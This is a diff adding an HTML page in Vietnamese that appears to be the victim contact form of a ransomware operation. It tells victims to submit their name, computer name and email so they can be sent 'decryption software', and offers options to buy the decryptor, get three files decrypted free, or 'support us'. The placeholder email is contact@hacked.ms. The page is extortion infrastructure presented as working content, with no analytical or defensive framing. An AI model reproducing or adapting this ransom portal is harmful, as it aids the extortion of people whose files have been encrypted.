@@ -1,0 +1,72 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {font-family: Arial, Helvetica, sans-serif;}
+* {box-sizing: border-box;}
+
+input[type=text], select, textarea {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-sizing: border-box;
+    margin-top: 6px;
+    margin-bottom: 16px;
+    resize: vertical;
+}
+
+input[type=submit] {
+    background-color: #4CAF50;
+    color: white;
+    padding: 12px 20px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+input[type=submit]:hover {
+    background-color: #45a049;
+}
+
+.container {
+    border-radius: 5px;
+    background-color: #f2f2f2;
+    padding: 20px;
+}
+</style>
+</head>
+<body>
+
+<h3>Contact Form</h3>
+<b><u>Lưu ý:</u></b> Bạn phải điền đầy đủ thông tin để chúng tôi gửi đúng phần mềm giải mã cho bạn!<br><br>
+<div class="container">
+  <form action="/msdata/send.html">
+    <label for="fname">Họ</label>
+    <input type="text" id="lname" name="lastname" placeholder="Họ của bạn">
+
+    <label for="lname">Tên</label>
+    <input type="text" id="fname" name="firstname" placeholder="Tên đệm và tên của bạn">
+    
+    <label for="pcname">Tên máy tính</label>
+    <input type="text" id="pcname" name="pcname" placeholder="SystemName">
+    
+    <label for="email">Email</label>
+    <input type="text" id="email" name="email" placeholder="contact@hacked.ms">
+
+    <label for="support">Hỗ trợ về</label>
+    <select id="support" name="support">
+      <option value="buy">Mua phần mềm giải mã</option>
+      <option value="free">Giải mã miễn phí 3 file</option>
+      <option value="donate">Hỗ trợ chúng tôi</option>
+    </select>
+
+    <label for="subject">Tin nhắn</label>
+    <textarea id="subject" name="subject" placeholder="Viết tại đây" style="height:200px"></textarea>
+
+    <input type="submit" value="Gửi">
+  </form>
+</div>
+</body>
+</html>
